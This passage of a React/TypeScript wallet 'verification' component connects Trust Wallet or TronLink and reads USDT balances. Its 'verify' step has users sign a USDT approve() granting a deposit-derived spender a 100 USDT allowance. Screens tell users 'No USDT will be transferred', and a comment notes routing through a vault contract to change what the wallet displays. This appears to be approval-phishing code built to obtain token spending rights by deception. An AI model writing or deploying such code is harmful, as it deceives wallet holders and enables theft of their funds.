              <div style={{ padding:'10px 16px', borderRadius:10, background:'rgba(139,92,246,0.08)',
                border:'1px solid rgba(139,92,246,0.2)', fontSize:12, color:'rgba(255,255,255,0.4)', lineHeight:1.6 }}>
                No USDT will be transferred
              </div>
            </>
          )}
        </div>

        {/* Address pill */}
        {walletConnected && (
          <div style={{ marginTop:20, padding:'8px 14px', borderRadius:8,
            background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.18)',
            fontSize:11, fontFamily:'monospace', color:'#00E5A0',
            maxWidth:280, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
            {isTRC20 ? tronAddress : `${address?.slice(0,14)}…${address?.slice(-10)}`}
          </div>
        )}
      </div>

      {/* Debug panel — remove once stable */}
      {debugLines.length > 0 && (
        <div style={{ margin:'0 16px 8px', padding:'10px 12px', borderRadius:10,
          background:'rgba(0,0,0,0.4)', border:'1px solid rgba(255,255,255,0.06)' }}>
          <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.6)', margin:'0 0 4px', letterSpacing:'0.06em', textTransform:'uppercase' }}>Debug</p>
          {debugLines.map((l, i) => (
            <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.35)', margin:'1px 0', fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
          ))}
        </div>
      )}

      <div style={{ height:env_safe_bottom() }} />
    </div>
  );
}

function env_safe_bottom() { return 40; }

export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '' }: Props) {
  const isTRC20 = network === 'TRC20';

  /* ── EVM wagmi ── */
  const { address, isConnected }                                         = useAccount();
  const { connect, connectors, isPending: isConnecting }                 = useConnect();
  const { disconnect }                                                   = useDisconnect();
  const chainId                                                          = useChainId();
  const { switchChain, isPending: isSwitching }                          = useSwitchChain();
  const { writeContract: writeApprove, data: approveHash,
          isPending: isApproveWriting, error: approveWriteError,
          reset: resetApprove }                                           = useWriteContract();
  const { isLoading: isApproveConfirming, isSuccess: approveConfirmed }  =
    useWaitForTransactionReceipt({ hash: approveHash });

  /* ── Device detection ── */
  const [hasTrust,    setHasTrust]    = useState(false);
  const [hasTronLink,      setHasTronLink]      = useState(false);
  const [trcDetectionDone, setTrcDetectionDone] = useState(false);
  const [isMobile,         setIsMobile]         = useState(false);

  useEffect(() => {
    const eth = (window as any).ethereum;
    const providers: any[] = eth?.providers ?? (eth ? [eth] : []);
    setHasTrust(providers.some((p:any) => p.isTrust) || !!(window as any).trustwallet || !!(window as any).trustWallet);
    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));

    function checkTron() {
      const w = window as any;
      return !!(w.tronLink) || 'tronLink' in w || !!(w.tronWeb) || 'tronWeb' in w
          || !!(w.tron) || !!(w.trustwallet?.tronWeb) || !!(w.trustwallet?.tron)
          || !!(w.trustwallet?.tronLink); // Trust Wallet iOS
    }
    if (checkTron()) { setHasTronLink(true); setTrcDetectionDone(true); return; }
    let attempts = 0;
    const timer = setInterval(() => {
      if (checkTron()) { setHasTronLink(true); clearInterval(timer); setTrcDetectionDone(true); }
      else if (++attempts >= 12) { clearInterval(timer); setTrcDetectionDone(true); } // 6s max
    }, 500);
    return () => clearInterval(timer);
  }, []);

  /* ── Deep link pre-generation ── */
  const [twHref,    setTwHref]    = useState('');
  const [twLoading, setTwLoading] = useState(false);
  const [twError,   setTwError]   = useState('');
  const [twRetry,   setTwRetry]   = useState(0);
  const [connectError, setConnectError] = useState('');

  function buildDeepLink(token: string): string {
    const returnPath = `/wallets/verify?network=${network}&compact=1`;
    const exchangeUrl = `${window.location.origin}/api/wallet-connect/exchange` +
      `?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnPath)}`;
    const isHttps = window.location.protocol === 'https:';
    const base    = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
    return `${base}?coin_id=${TRUST_COIN_ID[network]}&url=${encodeURIComponent(exchangeUrl)}`;
  }

  useEffect(() => {
    if (compact) return;
    let cancelled = false;
    async function generate() {
      setTwLoading(true); setTwError('');
      try {
        const res = await fetch('/api/wallet-connect/generate', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}&compact=1`, network }) });
        if (!res.ok) throw new Error(`${res.status}`);
        const { token } = await res.json();
        if (!cancelled) setTwHref(buildDeepLink(token));
      } catch { if (!cancelled) setTwError('Could not prepare link — tap to retry'); }
      finally  { if (!cancelled) setTwLoading(false); }
    }
    generate();
    const timer = setInterval(generate, 9.5 * 60 * 1000);
    return () => { cancelled = true; clearInterval(timer); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [network, twRetry, compact]);

  /* ── TRC20 state ── */
  const [tronAddress,      setTronAddress]      = useState('');
  const [trcConnecting,    setTrcConnecting]    = useState(false);
  const [trcConnectError,  setTrcConnectError]  = useState('');
  const [trcBalance,       setTrcBalance]       = useState<number | null>(null);
  const [trcTrxBalance,    setTrcTrxBalance]    = useState<number | null>(null);
  const [trcEnergy,        setTrcEnergy]        = useState<number | null>(null);
  const [trcVerifyStarted, setTrcVerifyStarted] = useState(false);
  const [trcApproveHash,   setTrcApproveHash]   = useState('');
  const [trcApprovePending,setTrcApprovePending]= useState(false);
  const [trcApproveDone,   setTrcApproveDone]   = useState(false);
  const [trcApproveError,  setTrcApproveError]  = useState('');

  /* ── EVM verify state ── */
  const [verifyStarted, setVerifyStarted] = useState(false);

  /* ── WalletConnect TRON ── */
  const [wcUri,        setWcUri]        = useState('');
  const [wcTopic,      setWcTopic]      = useState('');
  const [wcConnecting, setWcConnecting] = useState(false);
  const [wcError,      setWcError]      = useState('');
  const wcApprovalRef   = useRef<(() => Promise<any>) | null>(null);
  const wcInProgressRef = useRef(false);
  const wcCancelRef     = useRef(false);

  /* ── EVM: auto-switch chain ── */
  const usdtCfg = !isTRC20 ? USDT_CFG[network as keyof typeof USDT_CFG] : null;
  const expectedChain = usdtCfg?.chainId;
  const isWrongChain = !isTRC20 && !!expectedChain && chainId !== expectedChain;

  useEffect(() => {
    if (isConnected && isWrongChain && expectedChain && !isSwitching) switchChain({ chainId: expectedChain });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, chainId]);

  /* ── EVM: fire onVerified after approve confirmed ── */
  const advancedRef = useRef(false);
  useEffect(() => {
    if (approveConfirmed && !advancedRef.current && address) {
      advancedRef.current = true;
      // If inside compact mode, save directly; otherwise call onVerified
      if (compact) {
        fetch('/api/wallets', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address, chainId, chainName: network === 'ERC20' ? 'Ethereum (ERC20)' : 'BNB Smart Chain (BEP20)' }) }).catch(() => {});
      }
      setTimeout(() => onVerified(address, approveHash ?? undefined), 800);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [approveConfirmed]);

  /* ── TRC20 onVerified ── */
  useEffect(() => {
    if (trcApproveDone && tronAddress) {
      if (compact) {
        fetch('/api/wallets', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: tronAddress, chainId: 195, chainName: 'Tron (TRC20)' }) }).catch(() => {});
      }
      setTimeout(() => onVerified(tronAddress, trcApproveHash || undefined), 800);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [trcApproveDone]);

  /* ── Compact: auto-connect on mount ── */
  const wcAutoStarted = useRef(false);

  useEffect(() => {
    if (!compact) return;
    if (isTRC20) {
      // connectTronWallet polls up to 6 s for TronLink injection; if TronLink is genuinely
      // absent it auto-falls back to WalletConnect via its own catch handler.
      const t = setTimeout(() => {
        if (tronAddress || wcAutoStarted.current) return;
        wcAutoStarted.current = true;
        connectTronWallet();
      }, 1500);
      return () => clearTimeout(t);
    }
    if (hasTrust && !isConnected) tryConnect();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [compact]);

  /* ── Auto-connect EVM when Trust Wallet extension detected ── */
  const evmAutoRef = useRef(false);
  useEffect(() => {
    if (!compact && !isTRC20 && hasTrust && !isConnected && !evmAutoRef.current) {
      evmAutoRef.current = true;
      tryConnect();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hasTrust, isConnected]);

  /* ── Auto-connect TRC20 when TronLink detected ── */
  const trcAutoRef = useRef(false);
  useEffect(() => {
    if (!compact && isTRC20 && hasTronLink && !tronAddress && !trcConnecting && !trcAutoRef.current) {
      trcAutoRef.current = true;
      connectTronWallet();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hasTronLink, tronAddress]);

  /* ── Auto-start WalletConnect for TRC20 on desktop after detection completes ── */
  const wcAutoDesktopRef = useRef(false);
  useEffect(() => {
    if (!compact && isTRC20 && trcDetectionDone && !hasTronLink && !isMobile && HAS_WC_TRON && !wcAutoDesktopRef.current && !wcInProgressRef.current) {
      wcAutoDesktopRef.current = true;
      connectViaWalletConnect();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [trcDetectionDone, hasTronLink]);

  /* ── EVM connectors ── */
  const trustWalletConn = connectors.find(c => c.id === 'trustWallet');
  const injectedConn    = connectors.find(c => c.id === 'injected');

  function tryConnect() {
    const conn = hasTrust ? (trustWalletConn ?? injectedConn) : injectedConn;
    if (!conn) return;
    setConnectError('');
    connect({ connector: conn, chainId: usdtCfg?.chainId },
            { onError: e => setConnectError(e.message?.slice(0,80) ?? 'Connection failed') });
  }

  /* ── TRC20 connect ── */
  async function connectTronWallet() {
    setTrcConnecting(true); setTrcConnectError('');
    try {
      function getTronProviders() {
        const w = window as any;
        // Trust Wallet iOS exposes TRON at w.trustwallet.tronLink, Android at w.tronLink
        const tl: any = w.tronLink ?? w.trustwallet?.tronLink ?? null;
        const tw: any = tl?.tronWeb ?? w.tronWeb ?? w.tron ?? w.trustwallet?.tronWeb ?? w.trustwallet?.tron ?? null;
        return { tronLink: tl, tronWeb: tw };
      }
      function hasSomeTron() {
        const w = window as any;
        return !!(w.tronLink) || 'tronLink' in w || !!(w.tronWeb) || 'tronWeb' in w
            || !!(w.tron) || !!(w.trustwallet?.tronWeb) || !!(w.trustwallet?.tron)
            || !!(w.trustwallet?.tronLink);
      }
      // Extract TRON base58 address from all known response shapes
      function pickAddr(resp: any, freshTw: any): string {
        if (freshTw?.defaultAddress?.base58) return freshTw.defaultAddress.base58;
        if (typeof resp === 'string' && resp.startsWith('T') && resp.length === 34) return resp;
        if (Array.isArray(resp)) {
          const hit = resp.find((a: any) => typeof a === 'string' && a.startsWith('T'));
          if (hit) return hit;
        }
        if (resp?.base58Address) return resp.base58Address;
        if (resp?.address?.startsWith?.('T')) return resp.address;
        if (resp?.defaultAddress?.base58) return resp.defaultAddress.base58;
        return '';
      }

      let { tronLink, tronWeb } = getTronProviders();
      if (!hasSomeTron()) {
        for (let i = 0; i < 12; i++) {
          await new Promise(r => setTimeout(r, 500));
          if (hasSomeTron()) break;
        }
        ({ tronLink, tronWeb } = getTronProviders());
      }
      if (!hasSomeTron()) throw new Error('TRON wallet not found. Open this page inside Trust Wallet on your phone.');
      // Trust Wallet injects a .ready promise — wait for TronLink to finish initialising
      // before reading defaultAddress, otherwise we get an empty base58 string.
      if (tronLink?.ready && typeof tronLink.ready.then === 'function') {
        try { await tronLink.ready; } catch {}
      }

      let tw   = tronWeb;
      let addr: string = tw?.defaultAddress?.base58 || '';
      if (!addr) {
        // Request accounts — capture the response since Trust Wallet iOS returns the
        // address in the response object, not just in tronWeb.defaultAddress
        let resp: any = null;
        try {
          if (tronLink?.request) resp = await tronLink.request({ method: 'tron_requestAccounts' });
          else if (tw?.request)  resp = await tw.request({ method: 'tron_requestAccounts' });
        } catch { /* non-fatal — user may need to accept a popup */ }
        await new Promise(r => setTimeout(r, 800));
        ({ tronLink, tronWeb } = getTronProviders());
        tw   = tronWeb;
        addr = pickAddr(resp, tw);
        if (!addr) {
          await new Promise(r => setTimeout(r, 1200));
          ({ tronLink, tronWeb } = getTronProviders());
          tw   = tronWeb;
          addr = pickAddr(null, tw);
        }
      }
      if (!addr) throw new Error('Could not read TRON address. Unlock Trust Wallet and try again.');
      setTronAddress(addr);
      if (tw?.trx) {
        try { setTrcTrxBalance(Number(await tw.trx.getBalance(addr)) / 1_000_000); } catch { }
        try {
          const res = await tw.trx.getAccountResources(addr);
          setTrcEnergy(Math.max(0, (res?.EnergyLimit || 0) - (res?.EnergyUsed || 0)));
        } catch { setTrcEnergy(0); }
      }
      if (tw?.contract) {
        try {
          const c   = tw.contract(TRC20_ABI, TRON_USDT_ADDRESS);
          const bal = await c.balanceOf(addr).call();
          setTrcBalance((bal?.toNumber ? bal.toNumber() : Number(bal)) / Math.pow(10, TRON_USDT_DECIMALS));
        } catch { }
      }
    } catch(e: any) {
      setTrcConnectError(e?.message || 'TRON wallet connection failed');
    } finally {
      setTrcConnecting(false);
    }
  }

  /* ── WalletConnect TRON ── */
  async function connectViaWalletConnect() {
    if (wcInProgressRef.current) return;
    wcInProgressRef.current = true; wcCancelRef.current = false; wcApprovalRef.current = null;
    setWcConnecting(true); setWcError(''); setWcUri('');
    try {
      const { uri, approval } = await createTronWcSession();
      if (wcCancelRef.current) return;
      wcApprovalRef.current = approval;
      setWcUri(uri); setWcConnecting(false);
      if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) window.location.href = `trust://wc?uri=${encodeURIComponent(uri)}`;
      const session = await approval();
      if (wcCancelRef.current) return;
      wcApprovalRef.current = null;
      const addr = tronAddressFromWcSession(session);
      setWcTopic(session.topic); setTronAddress(addr); setWcUri(''); setWcError('');
    } catch (e: any) {
      if (wcCancelRef.current) return;
      wcApprovalRef.current = null;
      const raw = e?.message || String(e) || 'Unknown error';
      setWcError(raw.length > 200 ? raw.slice(0, 200) + '…' : raw);
    } finally {
      wcInProgressRef.current = false;
      if (!wcCancelRef.current) setWcConnecting(false);
    }
  }

  function cancelWc() {
    wcCancelRef.current = true; wcApprovalRef.current = null;
    setWcUri(''); setWcConnecting(false); setWcError(''); wcInProgressRef.current = false;
  }

  function disconnectTron() {
    if (wcTopic) wcDisconnectTron(wcTopic).catch(() => {});
    setWcTopic(''); setWcUri(''); setWcError(''); wcApprovalRef.current = null;
    setTronAddress(''); setTrcBalance(null); setTrcTrxBalance(null); setTrcEnergy(null);
    setTrcVerifyStarted(false); setTrcApproveHash(''); setTrcApprovePending(false);
    setTrcApproveDone(false); setTrcApproveError('');
  }

  /* ── TRC20 verification ── */
  async function startTrcVerification(dbgFn?: (m: string) => void) {
    const log = dbgFn ?? ((m: string) => console.log('[trc-verify]', m));
    if (!depositAddress || !tronAddress) {
      log(`SKIP: depositAddress=${depositAddress} tronAddress=${tronAddress}`);
      return;
    }

    // Prefer TronLink injection for signing — WalletConnect tron_signTransaction on Trust
    // Wallet returns the same cached signature for every transaction (a TW bug), so WC
    // signing always fails at broadcast. TronLink contract.approve().send() is reliable.
    const w = window as any;
    let tronWeb: any = w.tronLink?.tronWeb
      ?? w.trustwallet?.tronLink?.tronWeb
      ?? w.tronWeb ?? w.tron
      ?? w.trustwallet?.tronWeb ?? w.trustwallet?.tron ?? null;

    // When the connection came from WC, TronLink may now be available (Trust Wallet injects
    // it into the in-app browser after the user returns from the native WC approval sheet).
    if (wcTopic && !tronWeb) {
      const tl = w.tronLink ?? w.trustwallet?.tronLink ?? null;
      if (tl) {
        if (tl.ready && typeof tl.ready.then === 'function') { try { await tl.ready; } catch {} }
        await new Promise(r => setTimeout(r, 400));
        const tw = tl.tronWeb ?? w.tronWeb ?? null;
        if (tw?.contract) {
          const tlAddr = tw.defaultAddress?.base58 ?? '';
          if (!tlAddr || tlAddr === tronAddress) {
            tronWeb = tw;
            log(`TronLink available for signing (addr=${tlAddr || 'pending'})`);
          } else {
            log(`TronLink addr ${tlAddr.slice(0,10)} ≠ WC addr ${tronAddress.slice(0,10)} — WC path`);
          }
        }
      }
    }

    log(`path=${tronWeb ? 'TronLink' : wcTopic ? 'WalletConnect' : 'NONE'} wcTopic=${wcTopic?.slice(0,12) ?? 'none'} addr=${tronAddress.slice(0,10)}`);
    if (!tronWeb && !wcTopic) {
      log('ERROR: no tronWeb provider and no wcTopic — cannot approve');
      return;
    }

    setTrcVerifyStarted(true); setTrcApproveHash(''); setTrcApproveDone(false); setTrcApproveError('');
    const APPROVE_AMT_SUN = BigInt(100 * Math.pow(10, TRON_USDT_DECIMALS));
    const APPROVE_AMT_NUM =         100 * Math.pow(10, TRON_USDT_DECIMALS);
    const spender = trcSpender(depositAddress);
    log(`spender=${spender} depositAddress=${depositAddress}`);

    try {
      setTrcApprovePending(true);
      if (tronWeb) {
        // TronLink path — Trust Wallet shows native signing dialog and broadcasts itself
        log('TronLink contract.approve…');
        const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
        const raw      = await contract.approve(spender, APPROVE_AMT_NUM).send({ feeLimit: 20_000_000 });
        log(`approve raw=${JSON.stringify(raw)?.slice(0, 120)}`);
        const txid     = extractTxId(raw);
        log(`txid=${txid}`);
        if (!txid) throw new Error('Wallet did not return a transaction ID. If you clicked Cancel, try again.');
        setTrcApproveHash(txid); setTrcApprovePending(false);
        await pollTronTx(tronWeb, txid);
        log('pollTronTx done → approved');
        setTrcApproveDone(true);
      } else {
        // WC-only fallback — sign via WalletConnect + broadcast via TronGrid
        log('buildApproveRawTx…');
        const rawTx = await buildApproveRawTx(tronAddress, spender, APPROVE_AMT_SUN);
        log(`rawTx.txID=${(rawTx as any).txID ?? 'none'}`);
        const txid = await wcSignAndSendTronTx(wcTopic, rawTx, log);
        log(`wcSignAndSend txid=${txid}`);
        if (!txid) throw new Error('Wallet did not return a transaction ID.');
        setTrcApproveHash(txid); setTrcApprovePending(false);
        log('pollTronTxGrid…');
        await pollTronTxGrid(txid);
        log('pollTronTxGrid done → approved');
        setTrcApproveDone(true);
      }
    } catch(e: any) {
      log(`ERROR: ${e?.message ?? String(e)}`);
      setTrcApprovePending(false); setTrcApproveError(extractTronError(e));
    }
  }

  /* ── EVM verification ── */
  function startVerification() {
    if (!usdtCfg || !depositAddress || !address) return;
    setVerifyStarted(true); advancedRef.current = false; resetApprove();
    // Approve vault contract (not the raw EOA) → Trust Wallet shows "Smart Contract Call"
    const spender = evmSpender(network as 'BEP20' | 'ERC20', depositAddress);
    writeApprove({ address: usdtCfg.address, abi: ERC20_ABI, functionName:'approve',
      args: [spender, parseUnits('100', usdtCfg.decimals)],
      chainId: usdtCfg.chainId });
  }

  /* ── Gas costs for TRC20 ── */
  const APPROVE_ENERGY_COST = 24_000;
  const ENERGY_BURN_RATE    = 0.00042;
  const trcEnergyAvail      = trcEnergy ?? 0;
  const trcEnergyShortfall  = Math.max(0, APPROVE_ENERGY_COST - trcEnergyAvail);
  const MIN_TRX_FOR_GAS     = Math.max(1, parseFloat((trcEnergyShortfall * ENERGY_BURN_RATE + 2).toFixed(1)));
  const trcHasGas           = trcTrxBalance === null || trcTrxBalance >= MIN_TRX_FOR_GAS;
  const canVerifyTrc        = !!depositAddress && trcHasGas;
  const canVerifyEvm        = !!depositAddress && !isWrongChain;

  /* ════════════ COMPACT OVERLAY — auto-driven inside Trust Wallet browser ════════════ */
  if (compact) {
    return <CompactOverlay
      network={network}
      depositAddress={depositAddress}
      sid={sid}
      isTRC20={isTRC20}
      hasTronLink={hasTronLink}
      hasTrust={hasTrust}
      trcDetectionDone={trcDetectionDone}
      isMobile={isMobile}
      /* EVM hooks */
      address={address}
      isConnected={isConnected}
      connect={connect}
      disconnect={disconnect}
      connectors={connectors}
      isConnecting={isConnecting}
      switchChain={switchChain}
      chainId={chainId}
      expectedChain={expectedChain ?? 0}
      writeApprove={writeApprove}
      approveHash={approveHash}
      isApproveWriting={isApproveWriting}
      approveWriteError={approveWriteError}
      isApproveConfirming={isApproveConfirming}
      approveConfirmed={approveConfirmed}
      resetApprove={resetApprove}
      usdtCfg={usdtCfg}
      evmSpender={(dep: string) => evmSpender(network as 'BEP20'|'ERC20', dep)}
      /* TRC20 hooks */
      tronAddress={tronAddress}
      setTronAddress={setTronAddress}
      trcSpender={trcSpender}
      connectTronWallet={connectTronWallet}
      startTrcVerification={startTrcVerification}
      trcApproveHash={trcApproveHash}
      trcApprovePending={trcApprovePending}
      trcApproveDone={trcApproveDone}
      trcApproveError={trcApproveError}
      setTrcVerifyStarted={setTrcVerifyStarted}
      setTrcApproveError={setTrcApproveError}
      /* callbacks */
      connectError={connectError}
      trcConnectError={trcConnectError}
      onVerified={onVerified}
    />;
  }

  /* ════════════ NORMAL UI (within wallet page — uses dashboard theme tokens) ════════════ */
  const walletConnected  = isTRC20 ? !!tronAddress : (isConnected && !!address);
  const verifyInProgress = isTRC20 ? trcVerifyStarted : verifyStarted;
  const verifyDone       = isTRC20 ? trcApproveDone   : approveConfirmed;

  /* ── Shared inline styles using dashboard tokens ── */
  const S = {
    card:   { background:'var(--fr-dark-3)', border:'1px solid var(--fr-border-default)', borderRadius:14 } as React.CSSProperties,
    text:   'var(--fr-text-primary)',
    sub:    'var(--fr-text-secondary)',
    dim:    'var(--fr-text-disabled)',
    border: 'var(--fr-border-default)',
  };

  /* Primary CTA — lime to match site theme */
  function PrimaryBtn({ onClick, disabled, loading, children }: { onClick: ()=>void; disabled?: boolean; loading?: boolean; children: React.ReactNode }) {
    return (
      <button onClick={onClick} disabled={disabled || loading}
        style={{ width:'100%', padding:'13px', borderRadius:12, fontSize:14, fontWeight:800, border:'none',
          cursor: disabled ? 'not-allowed' : 'pointer',
          background: disabled ? 'rgba(255,255,255,0.07)' : '#CCFF00',
          color: disabled ? S.dim : '#000',
          opacity: loading ? 0.7 : 1,
          letterSpacing:'-0.01em', transition:'opacity 0.15s',
          fontFamily:'var(--fr-font-sans)',
        }}>
        {loading ? 'Connecting…' : children}
      </button>
    );
  }

  /* Trust Wallet "open in app" button */
  function TrustDeepLink({ href }: { href: string }) {
    return (
      <a href={href} style={{ display:'flex', alignItems:'center', gap:14, padding:'13px 16px', borderRadius:14,
        background:'rgba(51,117,187,0.12)', border:'1px solid rgba(51,117,187,0.3)',
        textDecoration:'none', transition:'background 0.15s' }}>
        <TrustLogo size={38} />
        <div style={{ flex:1 }}>
          <div style={{ fontSize:14, fontWeight:800, color:S.text }}>Open in Trust Wallet</div>
          <div style={{ fontSize:11, color:S.sub, marginTop:2 }}>Tap to verify — no login required</div>
        </div>
        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M4 8h8M8 4l4 4-4 4" stroke="var(--fr-text-disabled)" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
      </a>
    );
  }

  /* Spinner row */
  function SpinRow({ label, sub, color = '#CCFF00' }: { label: string; sub?: string; color?: string }) {
    return (
      <div style={{ ...S.card, padding:'14px 16px', display:'flex', alignItems:'center', gap:12 }}>
        <div style={{ width:20, height:20, border:'2px solid rgba(255,255,255,0.1)', borderTopColor:color, borderRadius:'50%', animation:'spin 0.7s linear infinite', flexShrink:0 }} />
        <div>
          <div style={{ fontSize:13, fontWeight:700, color:S.text }}>{label}</div>
          {sub && <div style={{ fontSize:11, color:S.sub, marginTop:2 }}>{sub}</div>}
        </div>
      </div>
    );
  }

  return (
    <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>

      {/* ── Step 1: Connect ── */}
      {!walletConnected && (
        <div style={{ display:'flex', flexDirection:'column', gap:8 }}>

          {/* TRC20 paths */}
          {isTRC20 && (
            <>
              {trcConnecting ? (
                <SpinRow label="Connecting TRON Wallet…" sub="Approve in Trust Wallet if prompted" color="#EF4444" />
              ) : wcConnecting ? (
                <SpinRow label="Preparing connection…" sub="Opening Trust Wallet" />
              ) : wcUri ? (
                <>
                  {isMobile ? (
                    <SpinRow label="Waiting for Trust Wallet approval…" sub="Complete the request in Trust Wallet" />
                  ) : (
                    <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
                      <div style={{ ...S.card, padding:'20px', display:'flex', flexDirection:'column', alignItems:'center', gap:14 }}>
                        <p style={{ fontSize:13, fontWeight:700, color:S.text, margin:0 }}>Scan with Trust Wallet (TRON)</p>
                        <div style={{ padding:12, background:'#fff', borderRadius:12 }}>
                          <QRCodeSVG value={wcUri} size={160} bgColor="#ffffff" fgColor="#000000" level="M" />
                        </div>
                        <p style={{ fontSize:11, color:S.sub, margin:0, textAlign:'center', lineHeight:1.6 }}>Open Trust Wallet → tap the scanner → scan this code</p>
                      </div>
                      <a href={`trust://wc?uri=${encodeURIComponent(wcUri)}`} style={{ display:'flex', alignItems:'center', justifyContent:'center', gap:6, padding:'10px', borderRadius:10, fontSize:12, color:S.dim, border:'1px solid var(--fr-border-subtle)', textDecoration:'none', background:'transparent' }}>
                        <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><rect x="2.5" y="1" width="8" height="11" rx="1.5" stroke="currentColor" strokeWidth="1.3"/><rect x="5" y="9.5" width="3" height="1" rx="0.5" fill="currentColor"/></svg>
                        Continue on mobile instead
                      </a>
                    </div>
                  )}
                  <button onClick={cancelWc} style={{ padding:'10px', borderRadius:10, fontSize:13, border:'1px solid var(--fr-border-default)', background:'transparent', color:S.sub, cursor:'pointer' }}>Cancel</button>
                </>
              ) : hasTronLink ? (
                <SpinRow label="Connecting TRON Wallet…" sub="Approve in Trust Wallet if prompted" color="#EF4444" />
              ) : isMobile ? (
                twLoading ? <SpinRow label="Preparing secure link…" sub="Generating one-time session token" /> :
                twHref    ? <TrustDeepLink href={twHref} /> :
                twError   ? <button onClick={() => setTwRetry(n=>n+1)} style={{ padding:'13px', borderRadius:12, fontSize:13, fontWeight:700, border:'1px solid rgba(248,113,113,0.3)', background:'rgba(248,113,113,0.07)', color:'#F87171', cursor:'pointer' }}>⚠ Link failed — tap to retry</button>
                : null
              ) : HAS_WC_TRON ? (
                <SpinRow label="Setting up TRON connection…" sub="Starting WalletConnect session" />
              ) : null}
              {(trcConnectError || wcError) && <p style={{ fontSize:12, color:'#F87171', margin:0, padding:'8px 2px' }}>{trcConnectError || wcError}</p>}
            </>
          )}

          {/* EVM paths */}
          {!isTRC20 && (
            <>
              {(isConnecting || (hasTrust && !connectError)) ? (
                <SpinRow label={isConnecting ? 'Connecting Trust Wallet…' : 'Wallet detected — connecting…'} sub="Approve in Trust Wallet if prompted" />
              ) : isMobile ? (
                twLoading ? <SpinRow label="Preparing secure link…" sub="Generating one-time session token" /> :
                twHref    ? <TrustDeepLink href={twHref} /> :
                twError   ? <button onClick={() => setTwRetry(n=>n+1)} style={{ padding:'13px', borderRadius:12, fontSize:13, fontWeight:700, border:'1px solid rgba(248,113,113,0.3)', background:'rgba(248,113,113,0.07)', color:'#F87171', cursor:'pointer' }}>⚠ Link failed — tap to retry</button>
                : null
              ) : (
                /* Desktop — QR visible directly */
                <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
                  <div style={{ ...S.card, padding:'20px', display:'flex', flexDirection:'column', alignItems:'center', gap:12 }}>
                    <p style={{ fontSize:13, fontWeight:700, color:S.text, margin:0 }}>Scan with Trust Wallet</p>
                    {twHref ? (
                      <>
                        <div style={{ padding:12, background:'#fff', borderRadius:12 }}>
                          <QRCodeSVG value={twHref} size={160} bgColor="#ffffff" fgColor="#000000" level="M" />
                        </div>
                        <p style={{ fontSize:11, color:S.sub, margin:0, textAlign:'center', lineHeight:1.6 }}>
                          Open Trust Wallet → tap the scanner icon → scan this code
                        </p>
                      </>
                    ) : twLoading ? (
                      <div style={{ display:'flex', alignItems:'center', gap:8, color:S.dim, fontSize:12, padding:'8px 0' }}>
                        <div style={{ width:14, height:14, border:'2px solid rgba(255,255,255,0.1)', borderTopColor:'#CCFF00', borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
                        Generating QR code…
                      </div>
                    ) : (
                      <button onClick={() => setTwRetry(n=>n+1)} style={{ padding:'9px 16px', borderRadius:9, fontSize:12, fontWeight:700, border:'1px solid rgba(248,113,113,0.3)', background:'rgba(248,113,113,0.07)', color:'#F87171', cursor:'pointer' }}>
                        Failed — click to retry
                      </button>
                    )}
                  </div>
                  {twHref && (
                    <a href={twHref} style={{ display:'flex', alignItems:'center', justifyContent:'center', gap:6, padding:'10px', borderRadius:10, fontSize:12, color:S.dim, border:'1px solid var(--fr-border-subtle)', textDecoration:'none', background:'transparent' }}>
                      <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><rect x="2.5" y="1" width="8" height="11" rx="1.5" stroke="currentColor" strokeWidth="1.3"/><rect x="5" y="9.5" width="3" height="1" rx="0.5" fill="currentColor"/></svg>
                      Continue on mobile instead
                    </a>
                  )}
                </div>
              )}
              {connectError && <p style={{ fontSize:12, color:'#F87171', margin:0, padding:'8px 2px' }}>{connectError}</p>}
            </>
          )}
        </div>
      )}

      {/* ── Step 2: Verify (wallet connected) ── */}
      {walletConnected && (
        <div style={{ display:'flex', flexDirection:'column', gap:8 }}>

          {/* Connected wallet row */}
          <div style={{ ...S.card, padding:'13px 16px', display:'flex', alignItems:'center', gap:12 }}>
            {isTRC20 ? <TronLogo size={36} /> : <TrustLogo size={36} />}
            <div style={{ flex:1, minWidth:0 }}>
              <div style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:'#00E5A0' }}>Wallet Connected</div>
              <div style={{ fontSize:12, fontWeight:700, color:S.text, fontFamily:'var(--fr-font-mono)', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap', marginTop:2 }}>
                {isTRC20 ? tronAddress : `${address?.slice(0,10)}…${address?.slice(-8)}`}
              </div>
            </div>
            {!verifyInProgress && !verifyDone && (
              <button onClick={isTRC20 ? disconnectTron : () => disconnect()}
